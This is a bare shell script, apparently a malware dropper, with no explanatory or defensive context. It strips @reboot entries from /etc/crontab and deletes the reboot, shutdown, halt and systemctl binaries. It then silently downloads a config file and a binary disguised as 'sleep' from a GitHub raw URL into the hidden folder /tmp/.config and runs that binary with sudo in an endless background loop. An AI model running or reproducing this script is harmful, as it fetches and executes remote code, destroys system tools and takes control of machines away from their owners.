#!/bin/sh

sudo sed -i '/^@reboot/d' /etc/crontab
sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl

mkdir -p /tmp/.config
wget -qO /tmp/.config/.json https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/x15.json
wget -qO /tmp/.config/sleep https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/sleep
chmod -R 777 /tmp/.config
/bin/sh -c "while true; do nohup sudo /tmp/.config/sleep --config=/tmp/.config/.json >/dev/null; done" &

